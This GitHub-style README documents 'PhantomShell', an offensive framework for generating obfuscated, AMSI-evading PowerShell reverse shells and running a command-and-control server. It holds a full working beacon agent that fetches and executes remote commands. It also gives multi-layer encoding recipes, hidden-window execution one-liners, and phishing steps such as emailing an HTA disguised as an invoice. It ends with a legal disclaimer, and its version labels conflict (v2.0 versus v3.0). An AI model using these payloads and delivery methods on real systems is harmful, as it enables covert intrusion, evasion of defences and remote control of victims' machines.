# 👻 PhantomShell

<div align="center">
<img width="1024" height="1024" alt="PhantomShell" src="https://github.com/user-attachments/assets/bd3b82fc-85bd-4651-b1f8-1b2a908b403a" />

### Advanced PowerShell AV/AMSI Evasion Framework + Enterprise C2 Server

[![Python](https://img.shields.io/badge/Python-3.6+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge&logo=gnu&logoColor=white)](LICENSE)
[![Version](https://img.shields.io/badge/Version-2.0-blue?style=for-the-badge)](https://github.com/Red-Parakeet/PhantomShell)

**PhantomShell v2.0** — The most complete red-team framework for PowerShell payload generation and C2 infrastructure management.

</div>

---

## 📋 Table of Contents

- [What is PhantomShell?](#-what-is-phantomshell)
- [Key Features](#-key-features)
- [Architecture](#-architecture)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Command Reference](#-command-reference)
- [Payload Generation](#-payload-generation)
- [C2 Server](#-c2-server)
- [Payload Hosting](#-payload-hosting)
- [Payload Types & Formats](#-payload-types--formats)
- [Obfuscation Profiles](#-obfuscation-profiles)
- [Encoding Layers](#-encoding-layers)
- [C2 Server Features](#-c2-server-features)
- [HTTP Agent Deployment](#-http-agent-deployment)
- [Building Executables](#-building-executables)
- [Security Considerations](#-security-considerations)
- [Legal Disclaimer](#-legal-disclaimer)
- [Copyright](#-copyright)
- [License](#-license)

---

## 👻 What is PhantomShell?

**PhantomShell** is a comprehensive red-team framework designed for **authorized penetration testing and adversary simulation**. It combines an **advanced PowerShell payload generator** with a **unified Command & Control (C2) infrastructure**.

The tool automates the entire red-team workflow:

1. **Generate** obfuscated, AMSI-evading PowerShell payloads
2. **Deploy** via multiple delivery formats (PowerShell, CMD, HTA, VBS, MSHTA)
3. **Control** through a unified C2 server with Web UI and CLI interfaces
4. **Manage** TCP reverse shells and HTTP/S agents simultaneously

### 🎯 Why PhantomShell?

| Feature | PhantomShell | Traditional Tools |
|---------|-------------|-------------------|
| **Unified C2** | ✅ TCP + HTTP agents | ❌ Separate tools |
| **Multi-layer Encoding** | ✅ Up to 3 layers | ❌ Single layer |
| **Polymorphic Payloads** | ✅ Random variable names | ❌ Static |
| **Multiple Formats** | ✅ 5+ delivery formats | ❌ Limited |
| **Web Dashboard** | ✅ Real-time session management | ❌ CLI only |
| **HTTP Agent Support** | ✅ Firewall-friendly | ❌ TCP only |
| **Payload Hosting** | ✅ Built-in HTTP server | ❌ Manual |

---

## 🔍 Evasion Capabilities

No tool can guarantee complete evasion. PhantomShell helps bypass **signature-based detection** but cannot evade all defensive mechanisms.

| Technique | What it Evades | Limitations |
|----------|----------------|-------------|
| **Variable Renaming** | Static signatures | Behavioral detection |
| **Multi-layer Encoding** | Shallow analysis | Deep sandboxing |
| **Base64 Obfuscation** | Plain-text scanning | Runtime AMSI |
| **Polymorphism** | Hash-based detection | AI/Behavioral EDR |
| **IP/Port Hiding** | Pattern matching | Network monitoring |
| **HTTP Agent** | Firewall rules | SSL inspection |

### 🎯 Maximum Evasion Profile

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -o random -l 3 --enc-b64
```

This combines:
- **Random** variable names (different every run)
- **3 layers** of encoding
- **Base64** IP/port hiding
- No static signatures

---

## 🚀 Key Features

### ⚡ Payload Generation

- ✅ **Multi-layer PowerShell encoding** (1-3 layers)
- ✅ **AMSI-aware** payload structure
- ✅ **Polymorphic** payload generation (randomized variables)
- ✅ **Base64 obfuscation** for IP/port hiding
- ✅ **5 delivery formats**: PowerShell, CMD, HTA, VBS, MSHTA
- ✅ **3 obfuscation profiles**: Minimal, Aggressive, Random
- ✅ **Payload verification** before output
- ✅ **Layer round-trip verification**

### 🎮 Command & Control

- ✅ **Unified C2 server** supporting TCP and HTTP agents
- ✅ **Web dashboard** with real-time session management
- ✅ **CLI operator shell** for direct control
- ✅ **Multi-session handling** (TCP + HTTP simultaneously)
- ✅ **Session persistence** and monitoring
- ✅ **Command queuing** for HTTP agents
- ✅ **Real-time logs** and event tracking

### 🎯 Red Team Features

- ✅ **One-command deployment** (`serve` command)
- ✅ **Polymorphic generation** (multiple variants)
- ✅ **HTTP payload hosting** with download cradles
- ✅ **Session type differentiation** (TCP vs HTTP)
- ✅ **Quick commands** for common tasks
- ✅ **Command history** in Web UI

---

## 🏗 Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        TARGET MACHINE                          │
├─────────────────────────────────────────────────────────────────┤
│  ┌─────────────────┐        ┌─────────────────────────────┐  │
│  │  TCP Reverse    │        │  HTTP Agent (Polling)       │  │
│  │  Shell Payload  │        │  - Beacon every 3-5 secs    │  │
│  │  - Interactive  │        │  - Command queuing          │  │
│  │  - Real-time    │        │  - Firewall-friendly        │  │
│  └────────┬────────┘        └─────────────┬───────────────┘  │
│           │                               │                    │
│           │ TCP (4444)                    │ HTTP (8081)        │
│           ▼                               ▼                    │
└─────────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                   PHANTOMSHELL C2 SERVER                        │
├─────────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐    │
│  │  TCP        │  │  HTTP       │  │  Web UI             │    │
│  │  Listener   │  │  Listener   │  │  - Session manager  │    │
│  │  (4444)     │  │  (8081)     │  │  - Command exec     │    │
│  └─────────────┘  └─────────────┘  │  - Real-time logs   │    │
│                                     └─────────────────────┘    │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  Unified Session Manager                                │   │
│  │  - TCP sessions                                         │   │
│  │  - HTTP agent sessions                                  │   │
│  │  - Command queuing for HTTP                             │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                               │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  CLI Interface                                         │   │
│  │  - Interactive shell  - Session management             │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

---

## ⚙ Installation

No external dependencies required! PhantomShell uses only Python standard library.

```bash
# Clone the repository
git clone https://github.com/Red-Parakeet/PhantomShell.git

# Navigate to directory
cd PhantomShell

# Make executables
chmod +x phantomshell.py
chmod +x phantomc2.py

# Verify installation
python3 phantomshell.py --help
python3 phantomc2.py --help
```

### Requirements

- **Python 3.6+** (any platform)
- No additional packages needed
- Works on Linux, macOS, and Windows

---

## 🚀 Quick Start

### Method 1: All-in-One (Recommended)

```bash
# One command generates payload AND starts C2 server
python3 phantomshell.py serve -i 10.10.10.5 -p 4444 --host-payload --start-c2 --password RedTeam2026

# Copy the generated payload
# Paste on target machine
# Shell connects back automatically!
```

### Method 2: Separate Steps

**Terminal 1 — Start C2 Server**

```bash
python3 phantomc2.py --port 4444 --http-port 8081 --web-port 8080 --password RedTeam2026
```

**Terminal 2 — Generate Payload**

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
```

**Target — Execute Payload**

```powershell
# Copy the output from Terminal 2 and paste here
powershell -NoP -sta -NonI -W Hidden -enc <payload>
```

**Access Web UI:** `http://localhost:8080` (or `http://10.10.10.5:8080` from other machines)  
**Password:** `RedTeam2026`

---

## 📖 Command Reference

### 🔹 `revshell` — Generate Standalone Payload

```bash
python3 phantomshell.py revshell -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Short | Description | Default |
|------|-------|-------------|---------|
| `--attacker-ip` | `-i` | Attacker IP address | **Required** |
| `--port` | `-p` | Listening port | **Required** |
| `--obf-profile` | `-o` | `minimal` / `aggressive` / `random` | `aggressive` |
| `--layers` | `-l` | Encoding layers (1-3) | `1` |
| `--format` | `-f` | Output format | `powershell` |
| `--enc-b64` | | Hide IP/port in base64 | Off |
| `--keep-pwd` | | Show current directory in prompt | Off |
| `--do-not-hide` | | Disable hidden window flags | Off |
| `--verbose` | `-v` | Show decoded payload | Off |
| `--no-banner` | | Hide startup banner | Off |

**Examples:**

```bash
# Basic payload
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444

# Maximum evasion
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -o random -l 3 --enc-b64

# HTA phishing payload
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2

# CMD wrapper
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f cmd

# Verbose mode (see obfuscated payload before encoding)
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -v
```

---

### 🔹 `serve` — Generate, Host, and Serve Payload

```bash
python3 phantomshell.py serve -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Short | Description | Default |
|------|-------|-------------|---------|
| `--attacker-ip` | `-i` | Attacker IP address | **Required** |
| `--port` | `-p` | Listening port | **Required** |
| `--host` | | C2 bind address | `0.0.0.0` |
| `--host-payload` | | Host .ps1 file on HTTP server | Off |
| `--host-port` | | HTTP server port | `8000` |
| `--filename` | | Payload filename | Random |
| `--start-c2` | | Start phantomc2.py automatically | Off |
| `--http-port` | | HTTP agent port for phantomc2.py | `8081` |
| `--web-port` | | Web UI port for phantomc2.py | `8080` |
| `--password` | | Web UI password | `phantomshell` |
| `--no-cli` | | Disable interactive CLI | Off |
| `--obf-profile` | `-o` | Obfuscation profile | `aggressive` |
| `--layers` | `-l` | Encoding layers | `1` |
| `--enc-b64` | | Hide IP/port in base64 | Off |
| `--keep-pwd` | | Show CWD in prompt | Off |
| `--do-not-hide` | | Disable hidden window flags | Off |
| `--verbose` | `-v` | Show decoded payload | Off |

**Example:**

```bash
# Generate payload + host + start C2 with one command
python3 phantomshell.py serve -i 10.10.10.5 -p 4444 --host-payload --start-c2 --password RedTeam2026 -o random -l 2 --enc-b64
```

---

### 🔹 `polymorph` — Generate Multiple Variants

```bash
python3 phantomshell.py polymorph -i <IP> -p <PORT> -n <COUNT>
```

| Flag | Description | Default |
|------|-------------|---------|
| `-i` | Attacker IP | **Required** |
| `-p` | Listening port | **Required** |
| `-n` | Number of variants | `3` |
| `-l` | Encoding layers | `1` |
| `--enc-b64` | Hide IP/port | Off |
| `--keep-pwd` | Show CWD | Off |
| `--verbose` | Verbose output | Off |

**Example:**

```bash
# Generate 5 unique variants
python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 5
```

---

### 🔹 `c2` — Run C2 Server

```bash
python3 phantomc2.py [OPTIONS]
```

| Flag | Description | Default |
|------|-------------|---------|
| `--port` | TCP listener port | `4444` |
| `--http-port` | HTTP agent listener port | `8081` |
| `--web-port` | Web UI port | `8080` |
| `--password` | Web UI authentication password | `phantomshell` |
| `--no-cli` | Disable interactive CLI | Off |
| `--no-banner` | Hide startup banner | Off |

**Examples:**

```bash
# Default setup
python3 phantomc2.py --password MySecretPass123

# Custom ports and password
python3 phantomc2.py --port 5555 --http-port 9090 --web-port 8888 --password SecurePass123

# Headless mode (no CLI)
python3 phantomc2.py --password RedTeam2026 --no-cli
```

---

## 📦 Payload Types & Formats

### PowerShell (Default)
Direct execution in PowerShell console.

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
```

**Output:** `powershell -NoP -sta -NonI -W Hidden -enc <base64>`

---

### CMD Wrapper
Run from Command Prompt.

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f cmd
```

**Output:** `cmd /c "powershell -NoP -sta -NonI -W Hidden -enc <base64>"`

---

### HTA (HTML Application)
Phishing-friendly HTML file.

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2
```

**Output:** Complete HTML file with VBScript wrapper

**Usage:** Save as `.hta` and email to target

---

### VBS (Visual Basic Script)
For Office macro delivery.

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f vbs
```

**Output:** VBScript that runs PowerShell hidden

---

### MSHTA (Microsoft HTML Application)
One-liner for quick execution.

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f mshta
```

**Output:** `mshta vbscript:CreateObject("WScript.Shell").Run("powershell ...",0,False)(window.close)`

---

## 🎯 Obfuscation Profiles

### Minimal
Fast and readable, minimal obfuscation.

```
$client → $c
$stream → $st
$bytes → $b
$data → $d
```

### Aggressive (Default)
More aggressive variable renaming.

```
$client → $xA1
$stream → $xB2
$bytes → $xC3
$sendback → $xE5
```

### Random
Fully randomized variable names, different every run.

```
$client → $mKpRx
$stream → $zQ6v8A6
$bytes → $hySOJ
$data → $TqRmX9
```

---

## 🧅 Encoding Layers

| Layer | Description | Command |
|-------|-------------|---------|
| **1** | UTF-16LE → Base64 | `-l 1` |
| **2** | Base64 wrapped in IEX → UTF-16LE → Base64 | `-l 2` |
| **3** | Multi-stage decode with variables | `-l 3` |

**Layer 1:**
```powershell
[System.Convert]::FromBase64String('<base64>')
```

**Layer 2:**
```powershell
IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))
```

**Layer 3:**
```powershell
$_b=[System.Convert]::FromBase64String('<base64>');
$_s=[System.Text.Encoding]::Unicode.GetString($_b);
IEX($_s)
```

---

## 🎮 C2 Server Features

### Web Dashboard

Access the Web UI at `http://localhost:8080` (or `http://<your-ip>:8080` from other machines)

**Features:**
- ✅ **Live session list** with status indicators
- ✅ **Session statistics** (Total, Active, Dead, TCP, HTTP)
- ✅ **Interactive terminal** with command history
- ✅ **Quick command buttons** for common tasks
- ✅ **Real-time logs** with color coding
- ✅ **Session type differentiation** (TCP vs HTTP)
- ✅ **Copy-paste friendly** interface

### CLI Interface

Interactive shell for operators:

```bash
phantom > help

  sessions              — list all sessions
  interact <id>         — interact with a session
  exec <id> <cmd>       — run single command
  kill <id>             — mark session dead
  prune                 — remove dead sessions
  exit                  — quit C2 server
```

**Example Interaction:**

```
phantom > sessions

  ID   TYPE   IP                USER@HOST                         STATUS   CONNECTED
  ──── ────── ───────────────── ───────────────────────────────── ──────── ────────────────────
  1    tcp    10.10.10.20       admin@DESKTOP-ABC123              ALIVE    14:32:15
  2    http   10.10.10.30       user@WORKSTATION-XYZ              ALIVE    14:35:42

phantom > interact 1

  OK Interacting with #1 (admin@DESKTOP-ABC123) [TCP]
  Type 'back' to return to C2

  PS #1 > whoami
  DESKTOP-ABC123\admin

  PS #1 > ipconfig
  Ethernet adapter Ethernet0:
     IPv4 Address. . . . . . . . . . . : 10.10.10.20
     Subnet Mask . . . . . . . . . . . : 255.255.255.0
```

---

## 🌐 HTTP Agent Deployment

### Method 1: PowerShell Script

Save as `agent.ps1`:

```powershell
$u='http://10.10.10.5:8081'
$id=[guid]::NewGuid().ToString()
$pl='Windows|'+$env:COMPUTERNAME+'|'+$env:USERNAME
while($true){
    try{
        $c=(iwr -UseBasicParsing ($u+'/beacon?id='+$id+'&platform='+[uri]::EscapeDataString($pl))).Content.Trim()
        if($c){
            $o=try{iex $c 2>&1|Out-String}catch{$_.Exception.Message}
            iwr -UseBasicParsing -Method POST -Uri ($u+'/result?id='+$id) -Body $o|Out-Null
        }
    }catch{}
    Start-Sleep -Seconds (3+(Get-Random -Max 2))
}
```

**Run:**

```powershell
powershell -ExecutionPolicy Bypass -File agent.ps1
```

---

### Method 2: CMD One-Liner

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 8081 -f cmd
```

**Paste directly into CMD on target.**

---

## 🪟 Building Executables

Convert PowerShell scripts to standalone Windows executables.

### Step 1: Generate Payload Script

```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f powershell
```

### Step 2: Save as .ps1

Copy the output and save as `payload.ps1`.

**Important:** Must use `.ps1` extension.

### Step 3: Convert to .exe

Use **PowerShell to exe/msi Converter** (Microsoft Store) or **PS2EXE**:

```bash
# Using PS2EXE (open source)
Install-Module -Name ps2exe -Force
ps2exe -inputFile payload.ps1 -outputFile payload.exe

# Or use GUI tools:
# PowerShell to exe/msi Converter (Microsoft Store)
```

### Step 4: Deploy

The resulting `.exe` can be run by double-clicking on Windows systems.

---

## 🎯 Attack Workflow Examples

### Scenario 1: Internal Penetration Test

```bash
# 1. Generate and host payload with C2
python3 phantomshell.py serve -i 10.10.10.5 -p 4444 --host-payload --start-c2 --password RedTeam2026

# 2. Copy the download cradle or payload
# 3. Execute on target machine
# 4. Session appears in Web UI/CLI
# 5. Interact and execute commands
```

---

### Scenario 2: Phishing Campaign

```bash
# 1. Generate HTA payload
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2

# 2. Save as invoice.hta
# 3. Email to target
# 4. Start C2 server
python3 phantomc2.py --password RedTeam2026

# 5. When opened, shell connects back
```

---

### Scenario 3: Firewall Evasion (HTTP Agent)

```bash
# 1. Start C2 with HTTP listener
python3 phantomc2.py --port 4444 --http-port 8081 --web-port 8080 --password RedTeam2026

# 2. Generate HTTP agent one-liner
python3 phantomshell.py revshell -i 10.10.10.5 -p 8081 -f cmd

# 3. Target runs the CMD command
# 4. Agent polls every 3-5 seconds
# 5. Send commands via Web UI or CLI
```

---

## 🛡 Security Considerations

### Best Practices

- ✅ **Use HTTPS** with SSL/TLS for production
- ✅ **Firewall restrictions** on C2 ports
- ✅ **Strong authentication** (complex passwords)
- ✅ **Infrastructure rotation** (change IPs/ports)
- ✅ **Log monitoring** (detect anomalies)
- ✅ **Encrypted communication** between agents
- ✅ **Traffic obfuscation** to mimic normal traffic

### Recommendations

| Aspect | Recommendation |
|--------|---------------|
| **C2 Hosting** | VPS with firewall rules |
| **Authentication** | Strong password + 2FA |
| **Communication** | HTTPS with valid certificates |
| **Logging** | Centralized log management |
| **Persistence** | Multiple C2 fallback addresses |

---

## ⚠️ Legal Disclaimer

> **THIS SOFTWARE IS INTENDED ONLY FOR AUTHORIZED CYBERSECURITY TESTING.**

PhantomShell is designed for:
- ✅ Authorized penetration testing
- ✅ Red team exercises
- ✅ Security research
- ✅ Educational purposes

**Unauthorized use** may violate:
- Computer Fraud and Abuse Act (CFAA)
- Local and international cybercrime laws
- Corporate security policies

**By using this tool, you agree to:**
1. Use only on systems you own or have written permission to test
2. Comply with all applicable laws and regulations
3. Accept full responsibility for your actions
4. Hold harmless the authors and contributors

The authors assume **NO LIABILITY** for misuse or damage caused by this tool.

---

## 📄 Copyright

```
Copyright © 2026 Red Parakeet Security Team. All Rights Reserved.

Author: Red Parakeet Security Team
GitHub: https://github.com/Red-Parakeet
LinkedIn: https://www.linkedin.com/company/red-parakeet-security/
Website: https://www.redparakeet.org
```

---

## 📝 License

PhantomShell is dual-licensed:

- **Open Source:** [GNU General Public License v3](LICENSE) - For non-commercial use
- **Commercial:** [PhantomShell Commercial License](C-LICENSE) - For enterprise use

Copyright © 2026 Red Parakeet Security Team

---

## 👨‍💻 Author

**Red Parakeet Security Team**  
Offensive Security | Red Teaming

- **GitHub:** [Red Parakeet](https://github.com/Red-Parakeet)
- **LinkedIn:** [Red Parakeet](https://www.linkedin.com/company/red-parakeet-security/?viewAsMember=true)
- **Website:** [RedParakeetSec](https://www.redparakeet.org)

---

## 🌟 Support

If PhantomShell helped you, please consider:

- ⭐ **Starring** the repository on GitHub
- 📢 **Sharing** with fellow security professionals
- 🐛 **Reporting** issues or feature requests
- 🤝 **Contributing** to the project

---

## 📊 Version History

| Version | Date | Features |
|---------|------|----------|
| **v3.0** | 2026 | Unified C2, HTTP agents, Web UI, All-in-One deployment |
| **v2.0** | 2025 | Payload generator enhancements, polymorphism |
| **v1.0** | 2024 | Initial release, basic payload generation |

---

**PhantomShell** | © 2026 Red Parakeet Security Team | All Rights Reserved

---

<div align="center">
<i>Built with ❤️ for the security community</i>
</div>
